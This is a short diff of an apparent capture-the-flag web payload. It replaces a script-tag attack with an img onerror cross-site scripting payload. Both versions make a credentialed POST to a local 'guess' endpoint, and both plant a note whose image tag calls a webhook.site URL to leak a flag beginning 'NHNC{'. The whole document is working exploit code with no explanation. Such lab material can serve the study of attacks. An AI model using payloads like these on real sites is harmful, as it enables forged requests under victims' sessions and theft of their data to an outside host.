@@ -1,12 +1,15 @@
-<script>
-  const data = new FormData();
-  data.append("guess", "NHNC{");
-  data.append("note", "<img src='http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?flag=NHNC{'>");
+<img src=x onerror="
+  const blob = new Blob([`<html><body><script>
+    fetch('http://127.0.0.1:5000/guess', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: 'guess=NHNC%7B&note=%3Cimg%20src%3Dhttp%3A%2F%2Fwebhook.site%2Fabc123%3E'
+    });
+  </script></body></html>`], { type: 'text/html' });
 
-  fetch("http://127.0.0.1:5000/guess", {
-    method: "POST",
-    credentials: "include",
-    body: data
-  });
-</script>
-
+  const url = URL.createObjectURL(blob);
+  window.open(url);
+">
